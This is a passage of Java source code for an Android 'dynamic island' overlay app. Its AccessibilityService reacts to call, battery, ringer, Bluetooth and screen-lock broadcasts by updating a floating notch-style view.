package com.tools.edge.dynamic.island.ui.component.service;

import static com.tools.edge.dynamic.island.ui.component.example.AccessibilityExample.exampleUsage;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.animation.ObjectAnimator;
import android.animation.ValueAnimator;
import android.annotation.SuppressLint;
import android.app.KeyguardManager;
import android.app.PendingIntent;
import android.bluetooth.BluetoothDevice;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.database.ContentObserver;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.media.AudioManager;
import android.media.MediaMetadata;
import android.media.session.MediaSessionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.TypedValue;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityWindowInfo;
import android.view.animation.Animation;
import android.widget.Chronometer;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.RequiresApi;
import androidx.constraintlayout.widget.ConstraintLayout;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.graphics.ColorUtils;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.airbnb.lottie.LottieAnimationView;
import com.google.android.gms.common.internal.BaseGmsClient;
import com.tools.edge.dynamic.island.R;
import com.tools.edge.dynamic.island.app.GlobalApp;
import com.tools.edge.dynamic.island.ui.component.adaptar.CustomNotificationAdapter;
import com.tools.edge.dynamic.island.ui.component.adaptar.CustomNotificationIconAdapter;
import com.tools.edge.dynamic.island.ui.component.background.AppConst;
import com.tools.edge.dynamic.island.ui.component.background.PrefManager;
import com.tools.edge.dynamic.island.ui.component.entity.AppDetail;
import com.tools.edge.dynamic.island.ui.component.entity.AppPackageList;
import com.tools.edge.dynamic.island.ui.component.entity.Notification;
import com.tools.edge.dynamic.island.ui.component.providers.InAppPurchaseProvider;
import com.tools.edge.dynamic.island.ui.component.utils.Constants;
import com.tools.edge.dynamic.island.ui.component.utils.ItemOffsetDecoration2;
import com.tools.edge.dynamic.island.ui.component.utils.Utils;
import com.tools.edge.dynamic.island.ui.component.views.CustomRecyclerView;
import com.tools.edge.dynamic.island.utils.SharePreferenceUtil;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Locale;
import java.util.Objects;
import java.util.Set;

import de.hdodenhof.circleimageview.CircleImageView;

public class ITGAccessibilityService extends AccessibilityService {
    public static final Uri ENABLED_ACCESSIBILITY_SERVICES = Settings.Secure.getUriFor("enabled_accessibility_services");
    private static MContentObserver mContentObserver;

    public CustomNotificationAdapter adapter_island_big;
    public DisplayMetrics metrics = new DisplayMetrics();

    public CustomNotificationIconAdapter adapter_island_small;
    public AppPackageList callPKG = new AppPackageList();
    int currentIndex = 0;
    public AppPackageList filterPKG = new AppPackageList();
    int flagKeyBoard = 8913696;
    int flagNormal = 8913704;
    long lastUpdateTime = 0;
    private final Handler handler;
    boolean isControlEnabled = true;
    boolean isShake = false;
    private boolean isShowFullIsland = false;
    public boolean isInFullScreen;
    public boolean isMusic = false;

    public boolean isPhoneLocked;

    public LinearLayout island_parent_layout;
    public CircleImageView circleImageMusic;
    public ConstraintLayout constraintMode;
    public ImageView imageMode;
    public ImageView imagePin;
    public TextView tvMode;
    public TextView tvCharging;

    ObjectAnimator animator;

    public LinearLayout island_top_layout;
    private final ArrayList<Notification> list_big_island = new ArrayList<>();

    public Bundle sharedPreferences = new Bundle();
    public final String TAG = "Chinh_Test";

    public final ArrayList<Notification> list_small_island = new ArrayList<>();
    SharedPreferences.OnSharedPreferenceChangeListener listener;
    WindowManager.LayoutParams localLayoutParams;
    Context mContext;
    WindowManager manager;
    private int minWidth;
    private int minHeight;
    private boolean isAddMusicNotification = false;
    private int keepNotchDuration = 0;
    private boolean isShowChanging = true;
    boolean isNotchShowAction = false;
    private CountDownTimer countDownTimer;
    private boolean isCall = false;
    private boolean isReceiverCall = false;
    public static ITGAccessibilityService iTGAccessibilityService;
    private String packNameMusicUpdateLastUpdate = "";
    private Notification notificationMusicBigIsland = null;

    private AccessibilityController accessibilityController;

    public static ITGAccessibilityService getInstance() {
        return iTGAccessibilityService;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        iTGAccessibilityService = this;
        lastUpdateTime = System.currentTimeMillis();
    }

    private BroadcastReceiver mInfoReceiver = new BroadcastReceiver() {
        @SuppressLint({"Range", "CommitPrefEdits"})
        public void onReceive(Context context, Intent intent) {
            BluetoothDevice bluetoothDevice;


            if (intent.getAction().equals(getPackageName() + Constants.UPDATE_MODUL)) {
                Log.d("chin_chin", "onReceive() called with: context = [" + context + "], intent = [" + intent + "]");
            }

            if (intent.getAction().equals(getPackageName() + AppConst.INTENT_LONG_CLICK)) {
                adapter_island_small.notifyDataSetChanged();
            }


            if (intent.getAction().equals(getPackageName() + AppConst.INTENT_NOTCH_VISIBILITY)) {
                initKeepNotch(context);
            }
            if (intent.getAction().equals(getPackageName() + AppConst.RESET_SIZE)) {
                if (isShowFullIsland) {
                    return;
                }
                localLayoutParams.width = (int) (130 * getResources().getDisplayMetrics().scaledDensity);
                localLayoutParams.height = (int) (25 * getResources().getDisplayMetrics().scaledDensity);
                minHeight = (int) (25 * getResources().getDisplayMetrics().scaledDensity);
                minWidth = (int) (130 * getResources().getDisplayMetrics().scaledDensity);
                new SharePreferenceUtil(mContext).setIntValue(AppConst.OVERLAY_WIDTH, 130);
                new SharePreferenceUtil(mContext).setIntValue(AppConst.OVERLAY_HEIGHT, 25);
                if (statusBarView.getParent() != null && manager != null) {
                    try {
                        manager.updateViewLayout(statusBarView, localLayoutParams);
                    } catch (Exception unused) {
                        unused.printStackTrace();
                    }
                    adapter_island_small.notifyDataSetChanged();
                }
            }
            if (intent.getAction().equals(getPackageName() + AppConst.RELOAD_DYNAMIC)) {
                onReloadDynamic();
            }
            if (intent.getAction().equals(getPackageName() + AppConst.SHAKE_ANIMATION)) {
                shake();
            }
            if (intent.getAction().equals(getPackageName() + AppConst.START_DYNAMIC)) {
                initDynamicFromShared();
            }
            if (intent.getAction().equals(getPackageName() + AppConst.CLOSE_DYNAMIC)) {
                if (statusBarView.getParent() != null && manager != null) {
                    try {
                        GlobalApp.instance.setAccessibilityActive(false);
                        manager.removeView(statusBarView);
                    } catch (Exception unused) {
                        unused.printStackTrace();
                    }
                }
            }
            if (intent.getAction().equals(getPackageName() + AppConst.RESET_POSITION)) {
                Log.e(TAG, "onReceive: RESET_POSITION ");
                x = 0;
                y = (int) (5 * 0.01 * metrics.heightPixels);
                localLayoutParams.x = 0;
                localLayoutParams.y = (int) (5 * 0.01 * metrics.heightPixels);
                new SharePreferenceUtil(mContext).setIntValue(AppConst.OVERLAY_X, 0);
                new SharePreferenceUtil(mContext).setIntValue(AppConst.OVERLAY_Y, 5);
                if (statusBarView.getParent() != null && manager != null) {
                    try {
                        manager.updateViewLayout(statusBarView, localLayoutParams);
                    } catch (Exception unused) {
                        unused.printStackTrace();
                    }
                }
            }
            if (intent.getAction().equals(getPackageName() + AppConst.DYNAMIC_STYLE)) {
                Bundle settings = intent.getExtras().getBundle("dynamic_style");
                for (String s : settings.keySet()) {
                    if (settings.get(s) instanceof Boolean) {
                        sharedPreferences.putBoolean(s, settings.getBoolean(s));
                    }
                }
                boolean isDynamicOval = sharedPreferences.getBoolean("oval_notification", true);
                if (isDynamicOval) {
                    statusBarView.findViewById(R.id.island_parent_layout).setBackgroundResource(R.drawable.rounded_rectangle_notification);
                } else {
                    statusBarView.findViewById(R.id.island_parent_layout).setBackgroundResource(R.drawable.rounded_bottom_notification);
                }
                Log.e(TAG, "onReceive: isDynamicOval " + isDynamicOval);
            }
            if (intent.getAction().equals(getPackageName() + AppConst.OVERLAY_LAYOUT_CHANGE)) {
                if (isShowFullIsland) {
                    return;
                }
                Bundle settings = intent.getExtras().getBundle("settings");
                for (String s : settings.keySet()) {
                    if (settings.get(s) instanceof Integer) {
                        sharedPreferences.putInt(s, settings.getInt(s));
                    }
                }
                if (statusBarView.getParent() != null && manager != null) {
                    int defaultMinWidth = (sharedPreferences.getInt("overlay_w", 130));
                    if (defaultMinWidth == 130) {
                        minWidth = (int) ((130 * getResources().getDisplayMetrics().scaledDensity));
                    } else {
                        minWidth = (int) (defaultMinWidth * getResources().getDisplayMetrics().scaledDensity);
                    }
                    int defaultMinHeight = (sharedPreferences.getInt("overlay_h", 25));
                    if (defaultMinHeight == 25) {
                        minHeight = (int) (25 * getResources().getDisplayMetrics().scaledDensity);
                    } else {
                        minHeight = (int) (defaultMinHeight * getResources().getDisplayMetrics().scaledDensity);
                    }
                    int defaultY = sharedPreferences.getInt("overlay_y", 5);
                    if (defaultY == 5) {
                        y = (int) (5 * 0.01 * metrics.heightPixels);
                    } else {
                        y = (int) (defaultY * 0.01 * metrics.heightPixels);
                    }
                    Log.e(TAG, "onReceive: overlay_y " + y);
                    Log.e(TAG, "onReceive: heightPixels " + metrics.heightPixels);
                    int overlayX = (int) (sharedPreferences.getInt("overlay_x", 0) * 0.01 * metrics.widthPixels);
                    int screenSize = metrics.widthPixels;
                    int marginX = minWidth / 2;
                    int maxMarginX = overlayX + marginX;
                    int minMarginX = overlayX - marginX;
                    if (maxMarginX >= screenSize / 2) {
                        x = screenSize / 2 - marginX;
                    } else if (minMarginX <= -(screenSize / 2)) {
                        x = -(screenSize / 2) + marginX;
                    } else {
                        x = overlayX;
                    }
                    localLayoutParams.x = x;
                    localLayoutParams.y = y;
                    localLayoutParams.width = minWidth;
                    localLayoutParams.height = minHeight;
                    try {
                        manager.updateViewLayout(statusBarView, localLayoutParams);
                    } catch (Exception unused) {
                        unused.printStackTrace();
                    }
                    adapter_island_small.notifyDataSetChanged();
                }

            }
            if (intent.getAction().matches(Intent.ACTION_CONFIGURATION_CHANGED)) {
                Configuration configuration = context.getResources().getConfiguration();
                boolean isHideInLandscape = new SharePreferenceUtil(context).getBooleanValue(AppConst.HIDE_IN_LANDSCAPE_MODE, true);
                if (configuration.orientation == Configuration.ORIENTATION_LANDSCAPE) {
                    if (isHideInLandscape) {
                        if (statusBarView.getParent() != null && manager != null) {
                            try {
                                GlobalApp.instance.setAccessibilityActive(false);
                                manager.removeView(statusBarView);
                            } catch (Exception unused) {
                                unused.printStackTrace();
                            }
                        }
                    } else {
                        if (statusBarView.getParent() != null && manager != null) {
                            localLayoutParams.x = 0;
                            localLayoutParams.y = (int) (5 * 0.01 * metrics.heightPixels);
                            try {
                                GlobalApp.instance.setAccessibilityActive(true);
                                manager.updateViewLayout(statusBarView, localLayoutParams);
                            } catch (Exception unused) {
                                unused.printStackTrace();
                            }
                        }
                    }
                }
                if (configuration.orientation == Configuration.ORIENTATION_PORTRAIT) {
                    Boolean isShow = new SharePreferenceUtil(mContext).getBooleanValue(AppConst.DYNAMIC_TURN_ON, false);
                    if (isHideInLandscape) {
                        if (statusBarView.getParent() == null && manager != null) {
                            try {

                                if (isShow) {
                                    GlobalApp.instance.setAccessibilityActive(true);
                                    manager.addView(statusBarView, localLayoutParams);
                                }
//                                GlobalApp.instance.setAccessibilityActive(true);
//                                manager.addView(statusBarView, localLayoutParams);
                            } catch (Exception unused) {
                                unused.printStackTrace();
                            }
                        }
                    } else {

                        if (isShow) {
                            if (statusBarView.getParent() != null && manager != null) {
                                localLayoutParams.x = x;
                                localLayoutParams.y = y;
                                try {
                                    GlobalApp.instance.setAccessibilityActive(true);
                                    manager.updateViewLayout(statusBarView, localLayoutParams);
                                } catch (Exception unused) {
                                    unused.printStackTrace();
                                }
                            }
                        }

                    }
                }
            }
            if (intent.getAction().matches("android.intent.action.PHONE_STATE")) {
                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if (!prefManager.getShowCall()) {
                            return;
                        }
                        String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
                        Chronometer chronometer = statusBarView.findViewById(R.id.chronometer);
                        LottieAnimationView lottieAnimationView = statusBarView.findViewById(R.id.lottie_call);
                        ConstraintLayout constraintLayout = statusBarView.findViewById(R.id.constraint_call);
                        if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {
                            //If the phone is **Ringing**
                        } else if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) {
                            //If the call is **Received**
                            if (isShowFullIsland) {
                                closeFullNotificationIsland();
                            }
                            isReceiverCall = true;
                            constraintLayout.setVisibility(View.VISIBLE);
                            if (prefManager.getShowTimeCall()) {
                                chronometer.setVisibility(View.VISIBLE);
                                chronometer.setBase(SystemClock.elapsedRealtime());
                                chronometer.start();
                            } else {
                                chronometer.setVisibility(View.GONE);
                            }
                            lottieAnimationView.setAnimation(R.raw.call_anim);
                            lottieAnimationView.setVisibility(View.VISIBLE);
                            if (!lottieAnimationView.isAnimating()) {
                                lottieAnimationView.playAnimation();
                            }
                            rv_island_small.setVisibility(View.GONE);
                            Log.e(TAG, "onReceive Received: 2");
                        } else if (state.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
                            //If the call is **Dropped** or **Rejected**
                            Log.e(TAG, "onReceive Rejected: 3");
                            if (isShowFullIsland) {
                                closeFullNotificationIsland();
                            }
                            notificationCall = null;
                            if (isReceiverCall) {
                                chronometer.setText("00:00");
                                if (lottieAnimationView.isAnimating()) {
                                    lottieAnimationView.cancelAnimation();
                                }
                                constraintLayout.setVisibility(View.GONE);
                                if (prefManager.getShowNotification()) {

                                    rv_island_small.setVisibility(View.VISIBLE);
                                }
                            }
                        }
                    }
                }, 1000L);
            }

            if (intent.getAction().matches("android.intent.action.BATTERY_CHANGED")) {


                if (isShowFullIsland) {
                    return;
                }
                boolean isFirstShow = prefManager.pref.getBoolean(AppConst.FIRST_SHOW_BATTERY_CHANGING, true);
                if (isFirstShow) {
                    prefManager.pref.edit().putBoolean(AppConst.FIRST_SHOW_BATTERY_CHANGING, false).commit();
                    return;
                }
                int intExtra = intent.getIntExtra(NotificationCompat.CATEGORY_STATUS, -1);
                if (intExtra == 2 || intExtra == 5 && isShowChanging) {
                    Log.e(TAG, "BATTERY_CHANGED 1: ");
                    Notification notification = null;
                    int i = 0;
                    while (true) {
                        if (i >= ITGAccessibilityService.this.list_small_island.size()) {
                            i = 0;
                            break;
                        } else if (((Notification) ITGAccessibilityService.this.list_small_island.get(i)).type.equals(Constants.TYPE_CHARGING)) {
                            notification = (Notification) ITGAccessibilityService.this.list_small_island.get(i);
                            break;
                        } else {
                            i++;
                        }
                    }
                    if (notification == null) {
                        notification = new Notification(Constants.TYPE_CHARGING, 0, 0);
                        //batter_add
                        if (prefManager.getShowNotificationBatteryChange() && isShowChanging) {
                            Log.e(TAG, "BATTERY_CHANGED VISIBLE: ");
                            isShowChanging = false;
                            constraintMode.setVisibility(View.VISIBLE);
                            imageMode.setVisibility(View.INVISIBLE);
                            imagePin.setVisibility(View.VISIBLE);
                            tvCharging.setVisibility(View.VISIBLE);
                            tvMode.setVisibility(View.VISIBLE);
                            tvMode.setText(ITGAccessibilityService.this.utils.getBatteryLevel() + "%");
                            tvMode.setTextColor(ITGAccessibilityService.this.mContext.getColor(R.color.green_500));
                            imagePin.setImageResource(ITGAccessibilityService.this.utils.getBatteryImage());
                            if (ITGAccessibilityService.this.utils.getBatteryLevel() == 100) {
                                tvMode.setText(ITGAccessibilityService.this.mContext.getString(R.string.full_txt));
                            }
                            showQuickAction();
                        }
                    }
                    new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            if (constraintMode.getVisibility() == View.VISIBLE) {
                                constraintMode.setVisibility(View.GONE);
                            }
                        }
                    }, 4000L);
                } else {
                    Log.e(TAG, "BATTERY_CHANGED 2: ");
                    isShowChanging = true;
                    Iterator it = ITGAccessibilityService.this.list_small_island.iterator();
                    while (true) {
                        if (!it.hasNext()) {
                            break;
                        }
                        Notification notification2 = (Notification) it.next();
                        if (notification2.type.equals(Constants.TYPE_CHARGING)) {
                            ITGAccessibilityService.this.list_small_island.remove(notification2);
//                                    ITGAccessibilityService.this.scrollToLastItem();
                            break;

                        }
                    }

                }
            }

            if (intent.getAction().matches("android.media.RINGER_MODE_CHANGED")) {
                if (isShowFullIsland) {
                    return;
                }
                boolean isFirstShow = new SharePreferenceUtil(context).getBooleanValue(AppConst.FIRST_SHOW_RING_MODE, true);
                if (isFirstShow) {
                    new SharePreferenceUtil(context).setBooleanValue(AppConst.FIRST_SHOW_RING_MODE, false);
                    return;
                }
                if (prefManager.getShowNotificationRingMode()) {
                    isShake = new SharePreferenceUtil(mContext).getBooleanValue(AppConst.NOTIFICATION_ANIMATION, true);
                    int dndState = ITGAccessibilityService.this.utils.getDndState();
                    if (dndState != 0 && dndState != 1 && dndState != 2) {
                        Iterator it2 = ITGAccessibilityService.this.list_small_island.iterator();
                        while (true) {
                            if (!it2.hasNext()) {
                                break;
                            }
                            Notification notification3 = (Notification) it2.next();
                            if (notification3.type.equals(Constants.TYPE_SILENT)) {
                                ITGAccessibilityService.this.list_small_island.remove(notification3);
                                break;
                            }
                        }
                    } else {
                        Iterator it3 = ITGAccessibilityService.this.list_small_island.iterator();
                        while (true) {
                            if (!it3.hasNext()) {
                                break;
                            }
                            Notification notification4 = (Notification) it3.next();
                            if (notification4.type.equals(Constants.TYPE_SILENT)) {
                                ITGAccessibilityService.this.list_small_island.remove(notification4);
                                break;
                            }
                        }
                        if (dndState == AudioManager.RINGER_MODE_SILENT) {
                            constraintMode.setVisibility(View.VISIBLE);
                            tvCharging.setVisibility(View.GONE);
                            imagePin.setVisibility(View.GONE);
                            imageMode.setVisibility(View.VISIBLE);
                            tvMode.setVisibility(View.VISIBLE);
                            imageMode.setImageResource(R.drawable.ic_silent);
                            tvMode.setText(ITGAccessibilityService.this.mContext.getString(R.string.silent_txt));
                            tvMode.setTextColor(ITGAccessibilityService.this.mContext.getColor(R.color.red_500));
                        }
                        if (dndState == AudioManager.RINGER_MODE_VIBRATE) {
                            constraintMode.setVisibility(View.VISIBLE);
                            tvCharging.setVisibility(View.GONE);
                            imagePin.setVisibility(View.GONE);
                            imageMode.setVisibility(View.VISIBLE);
                            tvMode.setVisibility(View.VISIBLE);
                            imageMode.setImageResource(R.drawable.ic_vibration);
                            tvMode.setText(ITGAccessibilityService.this.mContext.getString(R.string.vibration));
                            tvMode.setTextColor(ITGAccessibilityService.this.mContext.getColor(R.color.color_FF9F2E));
                        }

                        if (dndState == AudioManager.RINGER_MODE_NORMAL) {
                            constraintMode.setVisibility(View.VISIBLE);
                            tvCharging.setVisibility(View.GONE);
                            imagePin.setVisibility(View.GONE);
                            imageMode.setVisibility(View.VISIBLE);
                            tvMode.setVisibility(View.VISIBLE);
                            imageMode.setImageResource(R.drawable.ic_sound);
                            tvMode.setText(ITGAccessibilityService.this.mContext.getString(R.string.sound));
                            tvMode.setTextColor(ITGAccessibilityService.this.mContext.getColor(R.color.color_00A03A));
                        }
                    }
                    ITGAccessibilityService.this.scrollToLastItem();
                    if (isShake && statusBarView.getParent() != null && manager != null) {
                        shake();
                    }
                    showQuickAction();
                }

                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if (constraintMode.getVisibility() == View.VISIBLE) {
                            constraintMode.setVisibility(View.GONE);
                        }
                    }
                }, 4000L);
            }
            if (intent.getAction() != null && (("android.bluetooth.device.action.ACL_CONNECTED".equals(intent.getAction()) || "android.bluetooth.device.action.ACL_DISCONNECTED".equals(intent.getAction())) && (bluetoothDevice = (BluetoothDevice) intent.getParcelableExtra("android.bluetooth.device.extra.DEVICE")) != null)) {
                if (isShowFullIsland) {
                    return;
                }
                if (prefManager.getShowNotificationHeadset()) {
                    if (Build.VERSION.SDK_INT < 31 || ActivityCompat.checkSelfPermission(ITGAccessibilityService.this.mContext, "android.permission.BLUETOOTH_CONNECT") == 0) {
                        if ("android.bluetooth.device.action.ACL_CONNECTED".equals(intent.getAction())) {
                            if (bluetoothDevice.getType() == 1) {
                                Iterator it4 = ITGAccessibilityService.this.list_small_island.iterator();
                                while (true) {
                                    if (!it4.hasNext()) {
                                        break;
                                    }
                                    Notification notification7 = (Notification) it4.next();
                                    if (notification7.type.equals(Constants.TYPE_AIRBUDS)) {
                                        ITGAccessibilityService.this.list_small_island.remove(notification7);
                                        break;
                                    }
                                }
                                Notification notification8 = new Notification(Constants.TYPE_AIRBUDS, 0, 0);
                                notification8.color = ITGAccessibilityService.this.mContext.getColor(R.color.green_500);
                                ITGAccessibilityService.this.list_small_island.add(notification8);
                            }
                            ITGAccessibilityService.this.scrollToLastItem();
                            showQuickAction();
                        }
                        if ("android.bluetooth.device.action.ACL_DISCONNECTED".equals(intent.getAction())) {
                            if (bluetoothDevice.getType() == 1) {
                                Iterator it5 = ITGAccessibilityService.this.list_small_island.iterator();
                                while (true) {
                                    if (!it5.hasNext()) {
                                        break;
                                    }
                                    Notification notification9 = (Notification) it5.next();
                                    if (notification9.type.equals(Constants.TYPE_AIRBUDS)) {
                                        ITGAccessibilityService.this.list_small_island.remove(notification9);
                                        break;
                                    }
                                }
                            }
                            ITGAccessibilityService.this.scrollToLastItem();
                        }
                    } else {
                        Toast.makeText(ITGAccessibilityService.this.mContext, R.string.bluetooth_permission, Toast.LENGTH_SHORT).show();
                        return;
                    }
                }

            }
            KeyguardManager keyguardManager = (KeyguardManager) ITGAccessibilityService.this.mContext.getSystemService(Context.KEYGUARD_SERVICE);


            if (!intent.getAction().equals("android.intent.action.USER_PRESENT") && !intent.getAction().equals("android.intent.action.SCREEN_OFF") && !intent.getAction().equals("android.intent.action.SCREEN_ON")) {
                return;
            }
            if (keyguardManager.inKeyguardRestrictedInputMode()) {

                ITGAccessibilityService.this.isPhoneLocked = true;
                if (!Constants.getShowOnLock(ITGAccessibilityService.this.mContext)) {
                    rv_island_small.setVisibility(View.GONE);
                    rv_island_big.setVisibility(View.GONE);
                }
                Log.e(TAG, "inKeyguardRestrictedInputMode 1");
//                prefManager.setClickAble(false);
                enableClick = false;

            } else {
                if (prefManager.getShowNotification()) {
                    rv_island_small.setVisibility(View.VISIBLE);
                }
                Log.e(TAG, "inKeyguardRestrictedInputMode 2");
//                prefManager.setClickAble(true);
                enableClick = true;
//
            }

        }
    };

    private int countReboot = 0;

    private void initDynamicFromShared() {
        int width = new SharePreferenceUtil(mContext).getIntValue(AppConst.OVERLAY_WIDTH, 130);
        int height = new SharePreferenceUtil(mContext).getIntValue(AppConst.OVERLAY_HEIGHT, 25);
        int overlay_x = new SharePreferenceUtil(mContext).getIntValue(AppConst.OVERLAY_X, 0);
        int overlay_y = new SharePreferenceUtil(mContext).getIntValue(AppConst.OVERLAY_Y, 5);
        minWidth = (int) (width * getResources().getDisplayMetrics().scaledDensity);
        minHeight = (int) (height * getResources().getDisplayMetrics().scaledDensity);
        int overlayX = (int) (overlay_x * 0.01 * metrics.widthPixels);
        int screenSize = metrics.widthPixels;
        int marginX = minWidth / 2;
        int maxMarginX = overlayX + marginX;
        int minMarginX = overlayX - marginX;
        if (maxMarginX >= screenSize / 2) {
            x = screenSize / 2 - marginX;
        } else if (minMarginX <= -(screenSize / 2)) {
            x = -(screenSize / 2) + marginX;
        } else {
            x = overlayX;
        }
        if (overlay_y == 5) {
            y = (int) (5 * 0.01 * metrics.heightPixels);
        } else {
            y = (int) (overlay_y * 0.01 * metrics.heightPixels);
        }
        localLayoutParams.width = minWidth;
        localLayoutParams.height = minHeight;
        localLayoutParams.x = x;
        localLayoutParams.y = y;
        Log.e(TAG, "onReceive width: " + minWidth);
        Log.e(TAG, "onReceive height: " + minHeight);
        Log.e(TAG, "onReceive x: " + x);
        Log.e(TAG, "onReceive y: " + y);
        if (statusBarView.getParent() == null && manager != null) {
            try {
                GlobalApp.instance.setAccessibilityActive(true);
                manager.addView(statusBarView, localLayoutParams);
            } catch (Exception unused) {
                unused.printStackTrace();
            }
        }
    }

    int margin = 6;
    private final int maxIslandHeight = 170;
    private final int maxIslandHeight2 = 110;
    private final int maxIslandHeightCall = 90;
    private final int maxIslandWidth = 350;
    Handler mediaHandler = new Handler(Looper.getMainLooper());
    Runnable mediaUpdateRunnable = new Runnable() {
        public void run() {
            Log.e(TAG, "mediaHandler kkk: ");
            Log.e(TAG, "mediaHandler: " + mediaHandler);
            ITGAccessibilityService.this.notification.duration = ITGAccessibilityService.this.getMediaDuration();
            ITGAccessibilityService.this.notification.position = ITGAccessibilityService.this.getMediaPosition();
            if (ITGAccessibilityService.this.notification.duration > 0) {
                ITGAccessibilityService.this.notification.progressMax = 100;
                ITGAccessibilityService.this.notification.progress = (int) ((((float) ITGAccessibilityService.this.notification.position) / ((float) ITGAccessibilityService.this.notification.duration)) * 100.0f);
                ITGAccessibilityService.this.notification.progressIndeterminate = false;
                ITGAccessibilityService.this.adapter_island_big.updateMediaProgress();
            }
            ITGAccessibilityService.this.mediaHandler.postDelayed(ITGAccessibilityService.this.mediaUpdateRunnable, 1000L);
        }
    };
    public int minCameIslandWidth = 110;

    @SuppressLint("ObjectAnimatorBinding")
    private void shake() {
        ObjectAnimator objectAnimator = ObjectAnimator.ofFloat(statusBarParentView, "translationX", 0f, 25f, -25f, 25f, -25f, 15f, -15f, 6f, -6f, 0f).setDuration(1000);
        objectAnimator.start();
    }

    public int minIslandHeight = 25;
    public int minOneCameIslandWidth = 130;
    public int minThreeCameIslandWidth = 200;
    public int minTwoCameIslandWidth = 110;
    private Notification notificationMusic;
    BroadcastReceiver notiReceiver = new BroadcastReceiver() {
        public void onReceive(Context context, Intent intent) {
            if (intent != null && Objects.requireNonNull(intent.getAction()).matches(Utils.FROM_NOTIFICATION_SERVICE + context.getPackageName()) && intent.getAction().equals(Utils.FROM_NOTIFICATION_SERVICE + context.getPackageName())) {
                if (!isShowFullIsland) {
                    ITGAccessibilityService.this.updateNotificationList(intent);
                } else {
                    if (isMusic) {
                        if (ITGAccessibilityService.this.mediaHandler != null) {
                            ITGAccessibilityService.this.mediaHandler.removeCallbacks(ITGAccessibilityService.this.mediaUpdateRunnable);
                        }
                        ITGAccessibilityService.this.updateNotificationList(intent);
                    }
                }
                initCircleMusic();
                initKeepNotch(context);
                isShake = new SharePreferenceUtil(context).getBooleanValue(AppConst.NOTIFICATION_ANIMATION, false);
                if (isShake && statusBarView.getParent() != null && manager != null) {
                    shake();
                }

            }
        }
    };
    int countMultiTask = 0;

    private void initCircleMusic() {
        if (isShowFullIsland) {
            return;
        }

        boolean contTaskMusic = false;
        boolean countTaskMap = false;

        if (notificationMusic != null) {
            list_small_island.add(notificationMusic);
        }
        int size = list_small_island.size();
        for (int i = 0; i < size; i++) {
            if (list_small_island.get(i).template.equals("MediaStyle")) {
                contTaskMusic = true;
            } else if (list_small_island.get(i).category.equals("navigation")) {
                countTaskMap = true;
            }
        }

        if (contTaskMusic && countTaskMap) {
            countMultiTask = 2;
        } else {
            if (contTaskMusic) {
                contTaskMusic = true;
                countMultiTask = 1;
            } else if (countTaskMap) {
                countTaskMap = true;
                countMultiTask = 1;
            }
        }

        if (size > 1) {
            for (int i = 0; i < size; i++) {
                Notification notification1 = list_small_island.get(i);
                if (notification1.template != null && notification1.template.equals("MediaStyle") && countMultiTask > 1) {
                    circleImageMusic.setVisibility(View.VISIBLE);
                    Log.e(TAG, "circleImageMusic VISIBLE 1: ");
                    circleImageMusic.setImageBitmap(notification1.senderIcon);
                    rotateImageViewInfinity();
                    notificationMusic = notification1;
                    notification1.isClearable = false;
                    list_small_island.remove(i);
                    showSmallIslandNotification();
                    Log.e(TAG, "showSmallIslandNotification 3: ");
                    break;

                }
            }

        }

        if (countMultiTask <= 1) {
            circleImageMusic.setVisibility(View.GONE);
            notificationMusic = null;
        }
//

        Log.d(TAG, "initCircleMusic() called size=" + countMultiTask);

        circleImageMusic.setOnClickListener(v -> {
            if (notificationMusic != null) {
                showFullIslandNotification(notificationMusic);
                Log.e(TAG, "showFullIslandNotification musci: ");
            }
        });
    }

    Notification notification;
    int pos = 1;
    public PrefManager prefManager;
    public SharedPreferences preferences;

    public CustomRecyclerView rv_island_big;
    RecyclerView rv_island_small;
    public View statusBarParentView;
    public ConstraintLayout statusBarView;
    int tempMargin;
    private boolean useIphoneCallDesign = false;
    public Utils utils;
    public int zeroHeight = 0;

    public void initKeepNotch(Context context) {
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {

                if (isNotchShowAction || notificationMusic != null) {
                    if (countDownTimer != null) {
                        countDownTimer.cancel();
                    }
                    return;
                }
                if (statusBarView.getParent() == null) {
                    localLayoutParams.width = minWidth;
                    localLayoutParams.height = minHeight;
                    localLayoutParams.x = x;
                    localLayoutParams.y = y;
                    boolean dynamicTurnOn = new SharePreferenceUtil(context).getBooleanValue(AppConst.DYNAMIC_TURN_ON, false);
                    if (dynamicTurnOn) {
                        if (statusBarView.getParent() == null && manager != null) {
                            try {
                                GlobalApp.instance.setAccessibilityActive(true);
                                manager.addView(statusBarView, localLayoutParams);
                            } catch (Exception unused) {
                                unused.printStackTrace();
                            }
                        }
                    }
                }
